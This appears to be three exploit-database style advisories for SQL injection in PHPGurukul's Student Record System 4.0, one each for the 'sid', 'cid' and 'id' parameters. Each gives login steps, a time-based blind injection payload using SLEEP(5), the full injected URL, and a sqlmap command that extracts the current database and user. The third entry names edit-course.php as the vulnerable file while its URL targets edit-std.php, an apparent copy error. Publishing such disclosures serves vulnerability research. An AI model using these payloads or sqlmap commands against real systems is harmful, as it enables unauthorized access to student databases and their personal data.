# Exploit Title: Student Record System 4.0 - 'sid' SQL Injection  
# Date: 2/2/2021  
# Exploit Author: Jannick Tiger  
# Vendor Homepage: https://phpgurukul.com/  
# Software Link: https://phpgurukul.com/wp-content/uploads/2019/05/schoolmanagement.zip  
# Version: V 4.0    
# Tested on: Windows、XAMPP  

# Identify the vulnerability  
1. go to http://localhost/schoolmanagement/pages/login.php and login with your account  
2. then go to http://localhost/schoolmanagement/pages/view-subject.php  
3. Click edit on any user and then add the following payload to the url  
payload:' AND (SELECT 9300 FROM (SELECT(SLEEP(5)))RnkL) AND 'uXEB'='uXEB  
url:http://localhost/schoolmanagement/pages/edit-sub.php?sid=3' AND (SELECT 9300 FROM (SELECT(SLEEP(5)))RnkL) AND 'uXEB'='uXEB    
# Vulnerability file：edit-sub.php  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/sid.png)
# Exploit  
Now you can exploit it using sqlmap  
command: sqlmap -u url --batch --dbms=mysql --current-db --current-user  
example: sqlmap.py -u http://localhost/schoolmanagement/pages/edit-sub.php?sid=3 --batch --dbms=mysql --current-db --current-user  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/sidsql.png)  






# Exploit Title: Student Record System 4.0 - 'cid' SQL Injection    
# Date: 2/2/2021  
# Exploit Author: Jannick Tiger  
# Vendor Homepage: https://phpgurukul.com/  
# Software Link: https://phpgurukul.com/wp-content/uploads/2019/05/schoolmanagement.zip  
# Version: V 4.0    
# Tested on: Windows、XAMPP   


# Identify the vulnerability  
1. go to http://localhost/schoolmanagement/pages/login.php and login with your account  
2. then go to http://localhost/schoolmanagement/pages/view-course.php 
3. Click edit on any user and then add the following payload to the url  
payload:' AND (SELECT 9265 FROM (SELECT(SLEEP(5)))ljCB) AND 'yXjI'='yXjI   
url:http://localhost/schoolmanagement/pages/edit-course.php?cid=7'AND (SELECT 9265 FROM (SELECT(SLEEP(5)))ljCB) AND 'yXjI'='yXjI   
# Vulnerability file：edit-course.php  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/cid.png)
# Exploit  
Now you can exploit it using sqlmap  
command: sqlmap -u url --batch --dbms=mysql --current-db --current-user  
example: sqlmap.py -u http://localhost/schoolmanagement/pages/edit-course.php?cid=7 --batch --dbms=mysql --current-db --current-user  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/cidsql.png)    








# Exploit Title: Student Record System 4.0 - 'id' SQL Injection    
# Date: 2/2/2021  
# Exploit Author: Jannick Tiger  
# Vendor Homepage: https://phpgurukul.com/  
# Software Link: https://phpgurukul.com/wp-content/uploads/2019/05/schoolmanagement.zip  
# Version: V 4.0    
# Tested on: Windows、XAMPP   


# Identify the vulnerability  
1. go to http://localhost/schoolmanagement/pages/login.php and login with your account  
2. then go to http://localhost/schoolmanagement/pages/view.php 
3. Click edit on any user and then add the following payload to the url  
payload:' AND (SELECT 6593 FROM (SELECT(SLEEP(5)))tlDh) AND 'nzIe'='nzIe 
url:http://localhost/schoolmanagement/pages/edit-std.php?id=3' AND (SELECT 6593 FROM (SELECT(SLEEP(5)))tlDh) AND 'nzIe'='nzIe 
# Vulnerability file：edit-course.php  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/id.png)
# Exploit  
Now you can exploit it using sqlmap  
command: sqlmap -u url --batch --dbms=mysql --current-db --current-user  
example: sqlmap.py -u http://localhost/schoolmanagement/pages/edit-std.php?id=3 --batch --dbms=mysql --current-db --current-user  
![image](https://github.com/BigTiger2020/Student-Record-System-/blob/main/idsql.png)  
